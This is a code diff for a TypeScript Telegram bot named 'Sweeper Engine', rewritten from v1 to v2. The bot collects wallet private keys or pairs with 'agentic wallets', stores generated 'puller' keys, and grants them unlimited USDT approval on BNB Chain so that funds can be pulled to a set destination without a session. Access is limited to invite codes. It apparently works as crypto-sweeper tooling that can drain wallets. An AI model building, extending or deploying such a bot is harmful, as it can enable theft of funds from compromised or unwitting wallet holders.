@@ -1,191 +1,137 @@
 import { Telegraf } from 'telegraf';
 import { privateKeyToAccount } from 'viem/accounts';
-import { inviteOnlyGuard, adminGuard } from './middleware';
-import { mainDashboardKeyboard, adminPanelKeyboard } from './keyboards';
-import { addSweepTarget } from '../engine/storage';
-import { redis } from '../config/db';
-import { exec } from 'child_process';
-import { promisify } from 'util';
+import { authGuard } from './middleware';
+import { mainKeyboard, adminKeyboard } from './keyboards';
+import { upsertTarget, deactivate, listActive, newPuller } from '../engine/storage';
+import { grantAllowance, signin, verify } from '../engine/baw';
+import { allowanceOf, pullerGas } from '../engine/puller';
+import { ENV } from '../config/env';
+import { db } from '../config/db';
 
-const execAsync = promisify(exec);
+export function buildBot() {
+  const bot = new Telegraf(ENV.TOKEN);
+  bot.catch((e, ctx) => console.error(`[bot] ${ctx.updateType}:`, e));
+  bot.use(authGuard);
 
-export const setupBot = (token: string) => {
-    const bot = new Telegraf(token);
+  bot.start(async ctx => {
+    await ctx.reply('⚡ *Sweeper Engine v2*\n\nPuller mode armed.', {
+      parse_mode: 'Markdown', ...mainKeyboard,
+    });
+  });
 
-    bot.catch((err, ctx) => {
-        console.error(`[Bot Error] for ${ctx.updateType}:`, err);
+  bot.command('menu', ctx =>
+    ctx.reply('⚡ *Sweeper Engine v2*', { parse_mode: 'Markdown', ...mainKeyboard }));
+
+  bot.command('admin', ctx =>
+    ctx.reply('*Admin*', { parse_mode: 'Markdown', ...adminKeyboard }));
+
+  /**
+   * /arm <agentic_wallet> <cold_destination>
+   * Creates a puller keypair, registers the target, then attempts the allowance.
+   */
+  bot.command('arm', async ctx => {
+    const [, target, cold] = ctx.message.text.split(' ');
+    if (!target || !cold) {
+      return ctx.reply('Usage: `/arm <agentic_wallet> <cold_destination>`', { parse_mode: 'Markdown' });
+    }
+    const { key } = newPuller();
+    const account = privateKeyToAccount(key);
+    const userId = ctx.from!.id;
+    const instanceId = crypto.randomUUID();
+
+    await upsertTarget({
+      userId, target, destination: cold,
+      puller: account.address, pullerKey: key,
+      isAgentic: true, instanceId,
     });
 
-    bot.use(inviteOnlyGuard);
+    await ctx.reply(
+      `*Target registered*\n\n` +
+      `Wallet: \`${target}\`\nPuller: \`${account.address}\`\nCold: \`${cold}\`\n\n` +
+      `Now granting USDT allowance from the wallet to the puller. ` +
+      `Developer Mode must be ON.`,
+      { parse_mode: 'Markdown' },
+    );
 
-    bot.start(async (ctx) => {
-        await ctx.reply(
-            "⚡️ *Sweeper Engine V1*\n\nEngine is online. Dual-Mode routing active.", 
-            { parse_mode: 'Markdown', ...mainDashboardKeyboard }
-        );
-    });
+    try {
+      const { data } = await signin({ dir: `t${target}`, instanceId });
+      await ctx.reply(
+        `*Pair the wallet* (needed once, for the allowance)\n\n` +
+        `Code: \`${data.pairingCode}\`\n${data.urlForWeb}`,
+        { parse_mode: 'Markdown', link_preview_options: { is_disabled: true } },
+      );
+      await verify({ dir: `t${target}`, instanceId }, data.qrCodeId);
 
-    bot.command('admin', adminGuard, async (ctx) => {
-        await ctx.reply("🛡 *Admin Control Panel*", { 
-            parse_mode: 'Markdown', 
-            ...adminPanelKeyboard 
-        });
-    });
+      await grantAllowance({ dir: `t${target}`, instanceId }, ENV.USDT, account.address);
+      await ctx.reply('✅ *Allowance granted.* Puller is live and does not need a session.');
+    } catch (e: any) {
+      await ctx.reply(
+        `⚠️ Auto-approve failed: \`${String(e.stdout || e.message).slice(0, 140)}\`\n\n` +
+        `Grant it manually from a machine with a session:\n` +
+        `\`baw contract-call preview --binanceChainId 56 --to ${ENV.USDT} --function "approve(address,uint256)" --args "${account.address},MAX_UINT"\``,
+        { parse_mode: 'Markdown' },
+      );
+    }
+  });
 
-    bot.command('add', async (ctx) => {
-        const userId = ctx.from?.id;
-        const messageText = ctx.message.text;
-        const parts = messageText.split(' ');
+  bot.command('fund', async ctx => {
+    const rows = await listActive(ctx.from!.id);
+    if (!rows.length) return ctx.reply('No targets.');
+    const lines = await Promise.all(rows.map(async r => {
+      const gas = r.puller ? await pullerGas(r.puller) : 0n;
+      return `\`${r.target}\`\npuller \`${r.puller}\` gas ${Number(gas) / 1e18} BNB`;
+    }));
+    await ctx.reply(`*Puller addresses to fund:*\n\n${lines.join('\n\n')}`, { parse_mode: 'Markdown' });
+  });
 
-        if (parts.length !== 3) {
-            return ctx.reply("⚠️ Format: `/add <private_key> <destination_address>`", { parse_mode: 'Markdown' });
-        }
+  bot.command('unlink', async ctx => {
+    const target = ctx.message.text.split(' ')[1];
+    if (!target) return ctx.reply('Usage: `/unlink <wallet>`', { parse_mode: 'Markdown' });
+    await deactivate(ctx.from!.id, target);
+    await ctx.reply(`Removed \`${target}\``, { parse_mode: 'Markdown' });
+  });
 
-        const rawPrivateKey = parts[1];
-        const destinationAddress = parts[2];
-        const privateKey = rawPrivateKey.startsWith('0x') ? rawPrivateKey : `0x${rawPrivateKey}`;
+  bot.action('MONITORS', async ctx => {
+    await ctx.answerCbQuery();
+    const rows = await listActive(ctx.from!.id);
+    if (!rows.length) return ctx.reply('No targets. Use /arm.');
+    const body = await Promise.all(rows.map(async r => {
+      const a = r.puller ? await allowanceOf(r.target, r.puller) : 0n;
+      return `• \`${r.target}\` → \`${r.destination}\`\n  puller \`${r.puller}\`\n  allowance ${a > 0n ? 'OK' : '❌ MISSING'}`;
+    }));
+    await ctx.reply(`*Monitors*\n\n${body.join('\n\n')}`, { parse_mode: 'Markdown' });
+  });
 
-        try {
-            const account = privateKeyToAccount(privateKey as `0x${string}`);
-            const targetAddress = account.address;
+  bot.action('NEW_PULLER', async ctx => {
+    await ctx.answerCbQuery();
+    await ctx.reply('Use `/arm <agentic_wallet> <cold_destination>`', { parse_mode: 'Markdown' });
+  });
 
-            await addSweepTarget(userId!, targetAddress, destinationAddress, privateKey, false);
+  bot.action('STATUS', async ctx => {
+    await ctx.answerCbQuery();
+    const rows = await listActive(ctx.from!.id);
+    await ctx.reply(`Active: ${rows.length} · engine running`, { parse_mode: 'Markdown' });
+  });
 
-            await ctx.reply(`✅ *Private Key Wallet Added*\n\n🎯 Target: \`${targetAddress}\`\n🏦 Destination: \`${destinationAddress}\``, { parse_mode: 'Markdown' });
-            await ctx.deleteMessage(ctx.message.message_id).catch(() => {});
-        } catch (error) {
-            console.error(error);
-            await ctx.reply("❌ Invalid private key or address format.");
-        }
-    });
+  bot.action('INVITE', async ctx => {
+    if (ctx.from!.id !== ENV.ADMIN_ID) return ctx.answerCbQuery('Admin only');
+    await ctx.answerCbQuery();
+    const code = 'BEE-' + Math.random().toString(36).slice(2, 8).toUpperCase();
+    await db.query(`INSERT INTO invite_codes (code) VALUES ($1) ON CONFLICT DO NOTHING`, [code]);
+    await ctx.reply(`\`${code}\`\nhttps://t.me/${ctx.botInfo.username}?start=${code}`, { parse_mode: 'Markdown' });
+  });
 
-    // Use this command for your external bot-managed agentic wallet so it never logs out!
-    bot.command('link_manual', async (ctx) => {
-        const userId = ctx.from?.id;
-        const messageText = ctx.message.text;
-        const parts = messageText.split(' ');
+  bot.action('USERS', async ctx => {
+    if (ctx.from!.id !== ENV.ADMIN_ID) return ctx.answerCbQuery('Admin only');
+    await ctx.answerCbQuery();
+    const { rows } = await db.query(`SELECT user_id FROM authorized_users`);
+    await ctx.reply(`Authorized: ${rows.length}\n\`${rows.map(r => r.user_id).join(', ') || 'none'}\``, { parse_mode: 'Markdown' });
+  });
 
-        if (!userId) return;
+  bot.action('MENU', async ctx => {
+    await ctx.answerCbQuery();
+    await ctx.editMessageText('⚡ *Sweeper Engine v2*', { parse_mode: 'Markdown', ...mainKeyboard });
+  });
 
-        if (parts.length !== 3) {
-            return ctx.reply(
-                "⚠️ *Incorrect Format*\n\n" +
-                "Since your external bot is handling the session, link your agentic wallet manually without re-signing:\n" +
-                "`/link_manual <agent_wallet_address> <destination_address>`", 
-                { parse_mode: 'Markdown' }
-            );
-        }
-
-        const targetAddress = parts[1].startsWith('0x') ? parts[1] : `0x${parts[1]}`;
-        const destinationAddress = parts[2];
-
-        try {
-            // Save as agentic target without triggering auth signin (external bot stays logged in)
-            await addSweepTarget(userId, targetAddress, destinationAddress, '', true);
-
-            await ctx.reply(
-                `✅ *External Agentic Wallet Linked Successfully!*\n\n` +
-                `🤖 Agent Address: \`${targetAddress}\`\n` +
-                `🏦 Sweep Destination: \`${destinationAddress}\`\n\n` +
-                `_Your external bot session remains active, and our monitoring engine will track this address._`, 
-                { parse_mode: 'Markdown' }
-            );
-        } catch (error: any) {
-            console.error("Manual link error:", error);
-            await ctx.reply(`❌ Failed to link target: ${error.message}`);
-        }
-    });
-
-    // --- Dashboard Button Actions ---
-
-    bot.action('ADD_TARGET', async (ctx) => {
-        await ctx.answerCbQuery();
-        await ctx.reply(
-            "📝 *Add Target Wallet*\n\n" +
-            "Choose your connection method:\n\n" +
-            "1️⃣ *Standard Private Key*:\n`/add <private_key> <destination>`\n\n" +
-            "2️⃣ *External Agentic Wallet* (No re-signin):\n`/link_manual <agent_address> <destination>`", 
-            { parse_mode: 'Markdown' }
-        );
-    });
-
-    bot.action('USER_GUIDE', async (ctx) => {
-        await ctx.answerCbQuery();
-        await ctx.reply(
-            "📖 *Sweeper Engine User Guide*\n\n" +
-            "Welcome to the dual-engine automated asset router. Here is how to use the bot:\n\n" +
-            "🔑 *Method A: Standard Private Key*\n" +
-            "• Ideal for burner wallets.\n" +
-            "• Command: `/add <private_key> <destination_address>`\n\n" +
-            "🤖 *Method B: External Agentic Wallet*\n" +
-            "• Keeps your external bot session logged in without logging it out.\n" +
-            "• Command: `/link_manual <agent_address> <destination_address>`\n\n" +
-            "🛡 *Security Note:* All private keys are strongly encrypted at rest using AES-256.",
-            { parse_mode: 'Markdown' }
-        );
-    });
-
-    bot.action('SETTINGS', async (ctx) => {
-        await ctx.answerCbQuery();
-        await ctx.reply(
-            "⚙️ *Sweeper Settings*\n\n" +
-            "• Network: BNB Smart Chain Mainnet\n" +
-            "• Monitored Asset: USDT (BEP-20)\n" +
-            "• Gas Optimization: Auto-fee calculation active\n" +
-            "• Execution Mode: Dual-Mode (Raw Keys & Agentic)",
-            { parse_mode: 'Markdown' }
-        );
-    });
-
-    bot.action('MONITORS', async (ctx) => {
-        await ctx.answerCbQuery();
-        const keys = await redis.keys('target:*');
-        if (keys.length === 0) {
-            return ctx.reply("📊 *Active Monitors*\n\nNo wallets currently registered for sweeping.", { parse_mode: 'Markdown' });
-        }
-
-        let report = "📊 *Active Monitored Wallets*\n\n";
-        for (const key of keys) {
-            const data = await redis.hgetall(key);
-            const addr = key.split(':')[1];
-            const type = data.isAgentic === 'true' ? '🤖 Agentic' : '🔑 Raw Key';
-            report += `• \`${addr}\`\n  Type: ${type}\n  Dest: \`${data.destination}\`\n\n`;
-        }
-
-        await ctx.reply(report, { parse_mode: 'Markdown' });
-    });
-
-    // --- Admin Panel Button Actions ---
-
-    bot.action('GEN_INVITE', adminGuard, async (ctx) => {
-        await ctx.answerCbQuery();
-        const code = `BEE-${Math.random().toString(36).substring(2, 8).toUpperCase()}`;
-        
-        await redis.setex(`invite_code:${code}`, 86400, 'active');
-
-        await ctx.editMessageText(
-            `🔑 *New Invite Code Generated*\n\n` +
-            `Code: \`${code}\`\n` +
-            `Share this link with your user:\n` +
-            `\`https://t.me/${ctx.botInfo?.username}?start=${code}\`\n\n` +
-            `*(Expires in 24 hours, single-use)*`,
-            { parse_mode: 'Markdown', ...adminPanelKeyboard }
-        );
-    });
-
-    bot.action('LIST_USERS', adminGuard, async (ctx) => {
-        await ctx.answerCbQuery();
-        const users = await redis.smembers('whitelisted_users');
-        await ctx.reply(`👥 *Whitelisted Users Count:* ${users.length}\n\nUser IDs: \`${users.join(', ') || 'None'}\``, { parse_mode: 'Markdown' });
-    });
-
-    bot.action('MAIN_MENU', async (ctx) => {
-        await ctx.answerCbQuery();
-        await ctx.editMessageText(
-            "⚡️ *Sweeper Engine V1*\n\nEngine is online. Dual-Mode routing active.",
-            { parse_mode: 'Markdown', ...mainDashboardKeyboard }
-        );
-    });
-
-    return bot;
-};
+  return bot;
+}
